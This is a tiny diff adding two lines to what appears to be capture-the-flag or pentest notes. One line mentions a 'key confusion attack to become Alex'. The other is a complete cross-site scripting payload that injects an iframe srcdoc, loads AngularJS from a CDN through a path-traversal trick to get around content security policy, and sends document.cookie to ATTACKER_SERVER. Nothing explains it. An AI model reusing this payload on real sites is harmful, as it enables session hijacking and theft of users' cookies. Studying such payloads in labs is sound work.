@@ -1,0 +1,2 @@
+-   Key confusion attack to become Alex
+-   http://127.0.0.1/assets/img/logoaa.png?https://test.com?A\\B=''srcdoc='<script/src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/..%2f..%2f/angular.js/1.8.0/angular.js"></script><div/ng-app/ng-csp><textarea/autofocus/ng-focus=$event.view.parent.parent.open("https://ATTACKER_SERVER/?"+$event.view.document.cookie)></textarea></div>'
